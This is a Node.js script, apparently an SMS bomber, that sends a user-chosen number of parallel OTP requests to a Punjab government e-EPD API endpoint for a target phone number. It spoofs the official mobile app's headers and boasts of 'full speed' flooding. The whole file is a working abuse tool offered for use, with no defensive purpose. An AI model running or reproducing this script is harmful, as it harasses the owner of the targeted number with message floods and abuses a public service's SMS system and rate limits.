const axios = require('axios');
const readline = require('readline');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const base_url = "https://e-epd.punjab.gov.pk";

const headers = {
  'app': 'sans',
  'version': '28',
  'Content-Type': 'application/json; charset=UTF-8',
  'User-Agent': 'okhttp/4.5.0'
};

async function main() {
  const mobile = await question("Enter Mobile Number: ");
  const count = parseInt(await question("How many OTPs? "));

  console.log(`🚀 Sending ${count} OTPs at full speed...`);

  // Send all OTPs in parallel (MAX SPEED)
  const requests = Array(count).fill().map((_, i) => (
    axios.post(`${base_url}/api/sns_generate_mobile_otp`, {
      mobile_number: mobile
    }, { headers })
    .then(() => console.log(`✅ OTP ${i + 1} sent!`))
    .catch(e => console.log(`❌ OTP ${i + 1} failed: ${e.message}`))
  ));

  await Promise.all(requests); // Fire all requests together
  console.log("\n🔥 All OTPs sent! Developer: ⏤͟͞𝐎𝐋𝐃𝆺꯭𝅥𝐇𝐀𝐂𝐊𝙀𝐑");
  rl.close();
}

function question(prompt) {
  return new Promise(resolve => rl.question(prompt, resolve));
}

main().catch(console.error);
